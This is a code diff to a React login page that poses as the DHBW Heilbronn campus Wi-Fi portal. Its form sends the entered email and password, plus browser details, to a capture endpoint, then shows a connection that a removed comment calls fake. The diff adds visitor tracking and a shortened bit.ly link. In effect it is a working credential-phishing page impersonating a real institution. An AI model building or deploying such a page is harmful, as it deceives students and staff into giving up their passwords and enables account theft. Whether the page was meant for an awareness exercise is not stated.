@@ -10,9 +10,25 @@ export default function WlanLoginPage() {
   const [isConnecting, setIsConnecting] = useState(false);
   const [isConnected, setIsConnected] = useState(false);
   const [startTime, setStartTime] = useState<number | null>(null);
+  const bitlyLink = "https://bit.ly/3RCCQjG";
 
   useEffect(() => {
-    setStartTime(Date.now()); // Startzeitpunkt merken, wenn Seite geladen wird
+    setStartTime(Date.now());
+
+    const trackVisit = async () => {
+      await fetch("/api/wlan/tracking", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || "Direkter Zugriff",
+        }),
+      });
+    };
+
+    trackVisit();
   }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -21,10 +37,10 @@ export default function WlanLoginPage() {
     const form = e.target as HTMLFormElement;
     const email = (form.elements.namedItem("email") as HTMLInputElement).value;
     const password = (form.elements.namedItem("passwort") as HTMLInputElement).value;
-    
+
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
     const referrer = document.referrer || "Direkter Zugriff";
-    const sessionDuration = startTime ? Math.floor((Date.now() - startTime) / 1000) : 0; // in Sekunden
+    const sessionDuration = startTime ? Math.floor((Date.now() - startTime) / 1000) : 0;
 
     await fetch("/api/wlan/capture", {
       method: "POST",
@@ -40,7 +56,6 @@ export default function WlanLoginPage() {
       }),
     });
 
-    // Danach Fake-Verbindungslogik
     setIsConnecting(true);
 
     setTimeout(() => {
@@ -60,16 +75,20 @@ export default function WlanLoginPage() {
   }, [isConnected]);
 
   return (
-    <div className="min-h-screen bg-cover bg-center flex items-center justify-center" style={{ backgroundImage: "url('/campus-background.png')" }}>
-      <Card className="w-full max-w-xl bg-white border border-gray-300 rounded-none shadow-sm p-8">
+    <div className="min-h-screen bg-cover bg-center flex items-center justify-center p-4" style={{ backgroundImage: "url('/campus-background.png')" }}>
+      <Card className="w-full max-w-md bg-white border border-gray-300 rounded-none shadow-sm p-6 sm:p-8">
         <CardHeader className="flex flex-col items-center gap-4">
-          <Image
-            src="/dhbw-logo.png"
-            alt="DHBW Heilbronn Logo"
-            width={300}
-            height={130}
-            priority
-          />
+          <div className="w-48 sm:w-60">
+            <Image
+              src="/dhbw-logo.png"
+              alt="DHBW Heilbronn Logo"
+              width={300}
+              height={130}
+              className="w-full h-auto"
+              priority
+            />
+          </div>
+
           {!isConnected ? (
             <>
               <p className="text-center text-sm text-gray-800">
@@ -77,6 +96,9 @@ export default function WlanLoginPage() {
               </p>
               <p className="text-center text-xs text-gray-600 mt-2">
                 Bitte melden Sie sich an, um auf das Internet zuzugreifen.
+              </p>
+              <p className="text-center text-xs text-gray-400 mt-4 break-words">
+                Zugriff über: <a href={bitlyLink} target="_blank" className="underline">{bitlyLink}</a>
               </p>
             </>
           ) : (
